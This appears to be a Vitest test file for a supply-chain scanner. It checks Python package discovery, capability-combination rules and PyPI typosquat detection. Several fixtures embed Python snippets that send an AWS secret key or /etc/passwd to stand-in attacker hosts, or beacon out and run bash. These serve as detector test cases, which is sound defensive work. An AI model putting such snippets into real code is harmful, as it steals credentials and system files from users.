import { describe, it, expect, beforeAll } from 'vitest';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import { SupplyChainPolicySchema, type SupplyChainPolicy } from '@secureship/contracts';
import { analyzeSupplyChain } from '../../src/supply-chain/supply-chain-analyzer.js';
import { TreeSitterLoader } from '@secureship/reachability';

const POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
});

describe('Phase 3 Production Verification — Python Supply-Chain AST & PyPI Engine', () => {
  beforeAll(async () => {
    await TreeSitterLoader.init();
  });

  describe('1. Python Package Discovery', () => {
    it('discovers standalone Python projects from pyproject.toml and virtual environments', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-py-discover-'));

      try {
        // Create pyproject.toml
        fs.writeFileSync(
          path.join(tempDir, 'pyproject.toml'),
          `[project]\nname = "my-fastapi-service"\nversion = "2.1.0"\n`
        );

        // Create virtualenv with installed package
        const venvSitePackages = path.join(tempDir, '.venv', 'Lib', 'site-packages');
        const distInfoDir = path.join(venvSitePackages, 'safe_helper-1.0.0.dist-info');
        const pkgCodeDir = path.join(venvSitePackages, 'safe_helper');

        fs.mkdirSync(distInfoDir, { recursive: true });
        fs.mkdirSync(pkgCodeDir, { recursive: true });
        fs.writeFileSync(path.join(distInfoDir, 'METADATA'), 'Name: safe_helper\nVersion: 1.0.0\n');
        fs.writeFileSync(
          path.join(pkgCodeDir, '__init__.py'),
          'def helper():\n    return "benign string"\n'
        );

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
        });

        expect(result.stats.packagesAnalyzed).toBeGreaterThanOrEqual(2);
        expect(result.findings.filter((f) => f.ruleId === 'SC-CAP-100').length).toBe(0);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('2. Python Full AST Capability Extraction in Supply-Chain Scans', () => {
    it('detects SC-CAP-100 (Environment Access + Outbound Network Exfiltration) in Python source', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-py-cap100-'));

      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'malicious-py-lib');
        fs.mkdirSync(pkgDir, { recursive: true });

        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({ name: 'malicious-py-lib', version: '1.0.0' })
        );

        // Python payload with os.environ + requests.post exfiltration
        const pyPayload = `
import os
import requests

def exfil():
    api_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
    requests.post("https://c2.attacker.com/collect", json={"token": api_key})
`;
        fs.writeFileSync(path.join(pkgDir, 'tracker.py'), pyPayload);

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
        });

        const cap100Findings = result.findings.filter((f) => f.ruleId === 'SC-CAP-100');
        expect(cap100Findings.length).toBe(1);

        const hit = cap100Findings[0]!;
        expect(hit.severity).toBe('HIGH');
        expect(hit.package?.name).toBe('malicious-py-lib');
        expect(hit.location.filePath.endsWith('tracker.py')).toBe(true);
        const evidenceItems = (hit.evidence[0]?.metadata?.['items'] as unknown[]) ?? [];
        expect(evidenceItems.length).toBeGreaterThanOrEqual(2);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });

    it('detects SC-CAP-102 (Shell Execution + Outbound Network) in Python source across aliases', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-py-cap102-'));

      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'c2-shell-pkg');
        fs.mkdirSync(pkgDir, { recursive: true });

        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({ name: 'c2-shell-pkg', version: '1.0.0' })
        );

        const pyPayload = `
import subprocess as sp
from urllib.request import urlopen

def reverse_beacon():
    urlopen("http://attacker.com/beacon")
    sp.run(["/bin/bash", "-c", "whoami"], check=True)
`;
        fs.writeFileSync(path.join(pkgDir, 'backdoor.py'), pyPayload);

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
        });

        const cap102Findings = result.findings.filter((f) => f.ruleId === 'SC-CAP-102');
        expect(cap102Findings.length).toBe(1);

        const hit = cap102Findings[0]!;
        expect(hit.severity).toBe('HIGH');
        expect(hit.package?.name).toBe('c2-shell-pkg');
        expect(hit.location.filePath.endsWith('backdoor.py')).toBe(true);
        const evidenceItems = (hit.evidence[0]?.metadata?.['items'] as unknown[]) ?? [];
        expect(evidenceItems.length).toBeGreaterThanOrEqual(2);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });

    it('detects SC-CAP-101 (Network + Sensitive Filesystem Access) in Python source', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-py-cap101-'));

      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'exfil-shadow-pkg');
        fs.mkdirSync(pkgDir, { recursive: true });

        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({ name: 'exfil-shadow-pkg', version: '1.0.0' })
        );

        const pyPayload = `
import requests

def read_root_secrets():
    f = open("/etc/passwd", "r")
    data = f.read()
    requests.post("https://c2.exfil.org/dump", data=data)
`;
        fs.writeFileSync(path.join(pkgDir, 'scanner.py'), pyPayload);

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
        });

        // Combination SC-CAP-101: Network + Sensitive Filesystem Exfiltration
        const cap101Findings = result.findings.filter((f) => f.ruleId === 'SC-CAP-101');
        expect(cap101Findings.length).toBe(1);

        const hit = cap101Findings[0]!;
        expect(hit.severity).toBe('CRITICAL');
        expect(hit.package?.name).toBe('exfil-shadow-pkg');
        expect(hit.location.filePath.endsWith('scanner.py')).toBe(true);
        const evidenceItems = (hit.evidence[0]?.metadata?.['items'] as unknown[]) ?? [];
        expect(evidenceItems.length).toBeGreaterThanOrEqual(2);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('3. PyPI Typosquatting & Combosquatting Engine', () => {
    it('flags suffix inflation combosquatting targeting popular PyPI packages', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-pypi-typo-'));

      try {
        // Discovered as PyPI package via pyproject.toml
        fs.writeFileSync(
          path.join(tempDir, 'pyproject.toml'),
          `[project]\nname = "requests-py"\nversion = "0.1.0"\n`
        );
        fs.writeFileSync(
          path.join(tempDir, 'main.py'),
          'def get():\n    return "requests wrapper"\n'
        );

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
        });

        const typoHits = result.findings.filter(
          (f) => f.ruleId === 'SC-TYPO-002' || f.ruleId === 'SC-TYPO-001'
        );
        expect(typoHits.length).toBeGreaterThanOrEqual(1);

        const targetHit = typoHits[0]!;
        expect(targetHit.package?.name).toBe('requests-py');
        expect(targetHit.package?.ecosystem).toBe('pypi');
        expect(targetHit.description).toContain('requests');
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });
});
